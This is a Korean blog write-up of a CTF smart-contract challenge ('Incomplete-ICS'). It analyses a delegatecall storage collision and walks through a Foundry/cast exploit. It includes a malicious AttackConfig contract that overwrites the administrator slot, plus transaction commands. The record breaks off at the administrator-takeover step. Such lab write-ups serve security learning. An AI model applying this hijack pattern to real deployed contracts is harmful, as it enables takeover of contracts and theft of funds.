---
title: "[2025 ACS] Incomplete-ICS"
date: 2026-04-07 01:00:00 +0900
categories: [CTF/Wargame]
tags: [ctf, misc, 2025 ACS]
---

## 0. 개요

- **문제 이름** : Incomplete-ICS
- **환경** : 
  - nc 10.100.0.11 30000 - 인스턴스 생성 / 종료 / 플래그 조회 메뉴
  - rpc 10.100.0.11 30001 - 개인 블록체인 인스턴스 JSON-RPC
  - 각인스턴스는 **UUID**로 구분 되고, **10분 후 자동 종료**
- **목표** : `Setup.isSolved() == true` 상태를 만들어 플래그 획득  

---

## 1. 온체인 구조 분석

### 1-1. Setup.sol

```python
contract Setup {
    IndustrialControlSystem public icsContract;
    ConfigurationLibrary public configLib;
    DiagnosticLibrary public diagnosticLib;
    address public player;

    constructor() {
        configLib = new ConfigurationLibrary();
        diagnosticLib = new DiagnosticLibrary();

        icsContract = new IndustrialControlSystem(
            address(configLib),
            address(diagnosticLib)
        );

        player = tx.origin;
        icsContract.grantRole(player, IndustrialControlSystem.Role.OPERATOR);
    }

    function isSolved() public view returns (bool) {
        return icsContract.solved() == true;
    }

    function getChallengeInfo() public view returns (
        address icsAddress,
        address configLibAddress,
        address diagnosticLibAddress,
        address playerAddress,
        IndustrialControlSystem.Role playerRole
    ) {
        return (
            address(icsContract),
            address(configLib),
            address(diagnosticLib),
            player,
            icsContract.userRoles(player)
        );
    }
}
```
- 배포시 ConfigurationLibrary, DiagnosticLibrary, IndustrialControlSystem 순으로 생성.
- player = tx.origin → CTF 참가자의 EOA 주소가 player.  
- icsContract.grantRole(player, Role.OPERATOR);  
  - OPERATOR 권한을 가진 상태로 시작.  
- 플래그 체크: isSolved() == icsContract.solved().  

→ 결론: ICS 컨트랙트의 solved를 true로 만드는 게 목표.  

---

### 1-2. IndustrialControlSystem.sol

```python
contract IndustrialControlSystem {
    enum Role { OPERATOR, ENGINEER, ADMINISTRATOR }

    struct SystemConfig {
        uint256 maxPressure;
        uint256 maxTemperature;
        uint256 emergencyThreshold;
        bool safetySystemEnabled;
    }

    address public configurationLibrary;
    address public diagnosticLibrary;
    address public administrator;
    mapping(address => Role) public userRoles;
    SystemConfig public config;
    uint256 public currentPressure;
    uint256 public currentTemperature;
    bool public systemOperational;
    bool public solved;

    bytes4 constant CONFIG_SIG = bytes4(keccak256("updateConfig(uint256)"));
    bytes4 constant DIAGNOSTIC_SIG = bytes4(keccak256("runDiagnostic(uint256)"));
```

### 생성자

```python
constructor(address _configLib, address _diagnosticLib) {
    administrator = msg.sender; // Setup 컨트랙트 주소
    userRoles[msg.sender] = Role.ADMINISTRATOR;
    configurationLibrary = _configLib;
    diagnosticLibrary = _diagnosticLib;

    config = SystemConfig({
        maxPressure: 1000,
        maxTemperature: 150,
        emergencyThreshold: 1200,
        safetySystemEnabled: true
    });

    systemOperational = true;
    solved = false;
}
```
- **administrator = Setup 주소**
- safetySystemEnabled = true 초기값.

### 권한 관련

```python
modifier onlyRole(Role requiredRole) {
    require(userRoles[msg.sender] >= requiredRole, "ICS: Insufficient privileges");
    _;
}

modifier systemSafety() {
    require(config.safetySystemEnabled, "ICS: Safety system disabled");
    _;
}
```

- userRoles의 default 값은 enum의 0번, 즉 Role.OPERATOR
- -> 아무 주소나 최소 OPERATOR 권한을 가진다고 볼 수 있는 구조 (치명적인 설계).

### config 업데이트 함수

```python
function updateSystemConfig(uint256 _value)
    public
    onlyRole(Role.OPERATOR)
    systemSafety
{
    emit AccessAttempt(msg.sender, "updateSystemConfig", true);

    (bool success,) = configurationLibrary.delegatecall(
        abi.encodePacked(CONFIG_SIG, _value)
    );
    require(success, "ICS: Configuration update failed");

    emit ConfigurationChanged("system_parameter", 0, _value);
}
```

- 누구든 userRoles[msg.sender] >= OPERATOR(0)면 통과 -> 사실상 모든 주소 접근 가능.
- delegatecall(configurationLibrary, updateConfig(uint256))가 핵심이다.  

### solved를 true로 만드는 함수

```python
function claimVictory() public {
    require(msg.sender == administrator, "ICS: Only administrator can claim victory");
    solved = true;
    emit SystemAlert("CHALLENGE_SOLVED", block.timestamp);
}
```

- solved를 true로 만드는 유일한 함수.
- 단, msg.sender == administrator 여야 한다.
- 현재 administrator는 Setup -> EOA로는 호출 불가.

---

### 1-3. ConfigurationLibrary / DiagnosticLibrary

```python
contract ConfigurationLibrary {
    uint256 public configValue;

    function updateConfig(uint256 _value) public {
        configValue = _value;
    }
}
```

- storage layout : slot 0에 configValue.

```python
contract DiagnosticLibrary {
    uint256 public diagnosticResult;

    function runDiagnostic(uint256 _code) public {
        diagnosticResult = _code;
    }
}
```

---

## 2. 취약점 분석

### 2-1. delegatecall + storage 충돌  

ICS의 앞부분 storage : 

```pythone
address public configurationLibrary; // slot 0
address public diagnosticLibrary;    // slot 1
address public administrator;        // slot 2
// ...
SystemConfig public config;          // 이후 슬롯들
```

ConfigurationLibrary 의 storage : 

```python
uint256 public configValue; // slot 0
```

updateSystemConfig 실핼 시 : 

```python
configurationLibrary.delegatecall(
    abi.encodePacked(CONFIG_SIG, _value)
);
```

- delegatecall -> 코드만 라이브러리, **storage는 ICS 것 사용**
- ConfigurationLibrary.updateConfig(uint256)의 내용 :

```python
configValue = _value;
```

-> 실제로는 **ICS.storage[0] (configurationLibrary)**를 _value로 덮어쓰기.  
즉, updateSystemConfig(ATTACK_ADDR)을 호출하면  
ICS.configurationLibrary = ATTACK_ADDR로 변경할 수 있으며 이게 전체 공격의 시작점이다.  

--- 

### 2-2. 악성 라이브러리로 administrator 탈취

configurationLibrary를 우리가 만든 공격 컨트랙트로 바꾸면,  
그 다음에 updateSystemConfig(0)을 한 번 더 호출했을 때:  
- delegatecall 대상: AttackConfig  
- AttackConfig.updateConfig(uint256)를 ICS context에서 실행  
- assembly로 ICS.storage[2] (= administrator) 를 우리가 원하는 값으로 바꿀 수 있다.
  
예시 공격 컨트랙트:

```python
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract AttackConfig {
    function updateConfig(uint256) public {
        assembly {
            // ICS의 slot 2 = administrator
            sstore(2, origin())
        }
    }
}
```

- origin() = 트랙잭션을 날린 EOA (플레이어)
- 최종적으로 ICS.administrator = EOA 주소.
  
그 다음엔 EOA가 ICS.claimVictory() 를 직접 호출 가능하다.  

---

## 3. 공격 시나리오 개요

정리하면:  
delegatecall로 ICS의 configurationLibrary를 우리가 만든 악성 라이브러리로 바꾼 뒤,  
다시 delegatecall을 실행시켜 administrator를 우리 계정으로 바꾸고,  
claimVictory()를 호출해 solved = true 를 만든다.  
  
실제 단계:  
1. PoW 풀고 새 인스턴스 생성 → UUID, PK, RPC, Setup 주소 확보  
2. Setup.getChallengeInfo() 를 호출해서 ICS 주소를 구한다.  
3. 악성 라이브러리 AttackConfig 배포.  
4. ICS에 대해 updateSystemConfig(ATTACK_ADDR) 호출 → configurationLibrary = ATTACK.  
5. 다시 updateSystemConfig(0) 호출 → AttackConfig.updateConfig 실행, administrator = our EOA.  
6. ICS.claimVictory() 호출 → solved = true.  
7. nc에서 action 3 → uuid 입력 → 플래그 출력.  

---

## 4. 실제 익스플로잇 (Foundry + cast 기준)

### 4-1. 익스턴스 생성 & 정보 확보 

```python
nc 10.100.0.11 30000

1 - launch new instance
2 - kill instance
3 - get flag (if isSolved() is true)
action? 1
```

PoW 요구 나오면, 문제에서 알려준대로:

```python
python3 <(curl -sSL <https://minaminao.github.io/tools/solve-pow.py>)  24
```

출력된 your_input 값을 YOUR_INPUT에 넣어 PoW 통과.  

성공하면 이러한 정보가 나온다:

```python
uuid:               4bf39146-52b8-4123-94cd-cdefb83e1ff8
rpc endpoint:       <http://localhost:30001/4bf39146-52b8-4123-94cd-cdefb83e1ff8>
private key:        0x1f0e68e8...
your address:       0x8bB14741...
challenge contract: 0xf8e72f01...
```

### 4-2. 환경 변수 설정

WSL 에서:

```python
export UUID="4bf39146-52b8-4123-94cd-cdefb83e1ff8"
export RPC="<http://10.100.0.11:30001/$UUID>"
export PK="0x1f0e68e889f73460ec5c8e0bf1f6c99e9a03c1a6eed211db080ddb30f40ae033"
export SETUP="0xf8e72f01818D68c30f5945cC3f53A2e41a818436"
```

Foundry cast는 eth_sandbox에서 **X-UUID 헤더**도 필요하므로,  
모든 RPC 호출에 --rpc-headers "X-UUID:$UUID"를 붙였다.  

---

### 4-3. Setup에서 ICS 주소 가져오기

```python
cast call \\
  --rpc-url $RPC \\
  --rpc-headers "X-UUID:$UUID" \\
  $SETUP \\
  "getChallengeInfo()"
```

반환값(ABI-encoded)을 32바이트씩 나누면 첫 번째 20바이트가 ICS 주소:

```python
icsAddress = 0x97d5764ed2a5341deaeb9d6553f0c2398f642b48
...
```

환경변수로 저장:

```python
export ICS=0x97d5764ed2a5341deaeb9d6553f0c2398f642b48
```

---

### 4-4. 악성 라이브러리 AttackConfig.sol 작성 & 배포

src/AttackConfig.sol:

```python
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract AttackConfig {
    function updateConfig(uint256) public {
        assembly {
            // ICS의 storage slot 2는 administrator
            sstore(2, origin())
        }
    }
}
```

컴파일:

```python
forge build
```

배포:

```python
forge create src/AttackConfig.sol:AttackConfig \\
  --rpc-url $RPC \\
  --rpc-headers "X-UUID:$UUID" \\
  --private-key $PK \\
  --broadcast
```

출력 예:

```python
Deployer: 0x8bB147419e2358ef70b1c3EF33dC4EeAB5970200
Deployed to: 0x1d7A6A28F179B5ec87a05E469a061dABc449d5eb
Transaction hash: ...
```

공격 컨트랙트 주소 저:

```python
export ATTACK=0x1d7A6A28F179B5ec87a05E469a061dABc449d5eb
```

---

### 4-5. 1단계 - configurationLibrary = ATTACK 으로 덮어쓰기

```python
cast send \\
  --rpc-url $RPC \\
  --rpc-headers "X-UUID:$UUID" \\
  --private-key $PK \\
  $ICS \\
  "updateSystemConfig(uint256)" $(cast to-dec $ATTACK)
```

- onlyRole(Role.OPERATOR) → default 0으로 누구나 통과.  
- systemSafety → 초기값 true라 통과.  
- delegatecall로 ConfigurationLibrary.updateConfig(ATTACK) 실행  
- → ICS.slot0 (= configurationLibrary) = ATTACK 주소로 변경.
트랜잭션 결과에서 status 1 (success) 확인.

---

### 4-6. 2단계 - administrator 탈취









